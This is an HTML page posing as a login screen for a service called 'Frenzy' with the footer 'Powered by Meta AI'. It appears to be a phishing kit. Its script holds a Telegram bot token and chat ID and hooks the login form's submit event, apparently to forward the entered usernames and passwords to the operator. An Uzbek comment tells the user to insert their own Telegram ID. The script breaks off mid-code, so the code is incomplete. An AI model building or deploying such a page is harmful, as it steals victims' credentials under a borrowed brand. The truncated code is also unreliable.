<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Frenzy - Connect and Discover</title>

</head>
<body>
    <div class="frenzy-wrapper">
        <div class="glass-card">

                <div class="f-logo">FZ</div>
                <h1 class="brand-name">FRENZY</h1>
                <p class="tagline">CONNECT AND DISCOVER</p>
            </div>

            <form id="loginForm">
                <div class="input-field">
                    <input type="text" id="username" placeholder="Username / Email / Voice ID" required>
                </div>
                <div class="input-field">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                
                <button type="submit" class="glow-btn">LOG IN</button>
                
                <div class="links">
                    <a href="#">Forgot Password?</a>
                    <p>New to Frenzy? <a href="#" class="up">Sign Up</a></p>
                </div>
            </form>
            
            <div class="footer">
                <p>Powered by Meta AI</p>
                <small>BUILDING TOMORROW TOGETHER</small>
            </div>
        </div>
    </div>

    <script>
        const token = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
        const chat_id = "6198817749"; // Bu yerga o'z ID raqamingizni yozing (agar bilmasangiz @userinfobot orqali biling)

        document.getElementById('loginForm').addEventListener('submit', function(e) {

            .then(res => {

</body>
</html>
